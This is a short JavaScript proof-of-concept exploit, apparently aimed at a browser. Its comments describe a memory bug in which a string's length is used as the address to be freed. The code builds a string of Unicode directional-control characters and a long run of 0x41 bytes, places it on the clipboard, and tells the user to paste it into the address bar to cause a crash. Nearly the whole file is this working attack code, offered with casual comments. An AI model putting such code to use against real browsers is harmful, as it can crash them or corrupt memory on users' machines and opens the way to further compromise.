 /*****************************************************************************
 *                              liberum_arbitrium                             *
 *                                                                            *
 * this uses the other jank af version where you use the length of the added  *
 * string as the address, which works, but is still pretty unstable (moreso i *
 *    think), and also is only really practical at all for small addresses,   *
 * because it's kinda hard to get 0x4141414141414141 bytes into memory, good  *
 *                                luck tho lmfao                              *
 *                                                                            *
 *             update: now uses alternative way to free, like poc.py          *
 *                                                                            *
 *                           - with love from spv <3                          *
 *                                                                            *
 *****************************************************************************/

function poc() {
	var s = "";
	var a = ["\u202a", "\u202b", "\u202c", "\u202d", "\u202e", "\u202f"];
	var b = [];


	/*
	 i'm too lazy to figure out which b string causes the crash, will do later

	 update: i think it's 6
	 */

	/*
	 generate all 2-a-string combos
	 */
	for (i = 0; i < a.length; i++) {
		for (j = 0; j < a.length; j++) {
			b += a[i] + a[j];
		}
	}

	/*
	 bernie sanders
	 */
	for (i = 0; i < 36; i++) {
		s += b[i % (b.length)];
		if (i == 6) {
			/*
			 this is literal witchcraft
			 i have no idea why this will cause it to free the address

			 it literally takes the number of characters and uses it as the address
			 help

			 update: updated poc to free address in a different way
			 */
			s += "\x41\x41\x41\x41\x41\x41\x41\x41".repeat(0x2000);
		}
		else {
			/*
			 memory save
			 */
			s += "\1";
		}
	}

	/*
	 COPY!
	 COPY!
	 COPY!
	 COPY!
	 COPY!
	 */
	var type = "text/plain";
	var blob = new Blob([s], { type });
	var data = [new ClipboardItem({ [type]: blob })];

	navigator.clipboard.write(data);

	alert("paste in address bar to crash");
}

function pwn() {
	poc();
}
